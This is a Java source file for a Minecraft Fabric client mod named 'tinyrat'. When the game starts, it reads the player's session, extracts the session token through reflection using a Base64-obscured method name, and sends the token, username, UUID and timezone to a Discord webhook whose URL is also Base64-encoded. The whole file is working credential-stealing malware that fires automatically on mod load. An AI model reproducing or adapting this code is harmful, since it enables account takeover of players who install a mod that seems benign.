package com.github.tinyrat;

import java.time.ZoneId;

import com.github.tinyrat.utils.Base64Helper;
import com.github.tinyrat.utils.ConfigLoader;
import com.github.tinyrat.utils.DiscordEmbed;
import com.github.tinyrat.utils.DiscordWebhook;
import com.github.tinyrat.utils.ReflectionHelper;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;

public class Entry implements ClientModInitializer {
    public static final String MOD_ID = "tinyrat";

    private final Session session;

    public Entry() {
        MinecraftClient minecraft = MinecraftClient.getInstance();
        this.session = minecraft.getSession();
    }

    @Override
    public void onInitializeClient() {
        sendWebhook();
    }

    private void sendWebhook() {
        String webhookUrl = ConfigLoader.getWebhook();
        DiscordWebhook webhook = new DiscordWebhook(Base64Helper.decode(webhookUrl));

        DiscordEmbed embed = new DiscordEmbed("Session found");

        ZoneId currentTimezone = ZoneId.systemDefault();

        embed.addln("**Username:** [" + this.session.getUsername() + "](https://namemc.com/profile/" + this.session.getUuidOrNull() +")");
        embed.addln("**Timezone:** `" + currentTimezone.toString() + "`\n");
        embed.addln("**Session token:**\n||```" + this.getTokenViaReflection() + "```||");

        webhook.sendEmbed(embed);
    }

    private String getTokenViaReflection() {
        try {
            String methodName = Base64Helper.decode(ConfigLoader.getTokenMethodName());

            return ReflectionHelper.get(this.session, methodName, String.class);
        } catch (Exception e) {
            e.printStackTrace();
            return "Error retrieving token";
        }
    }
}
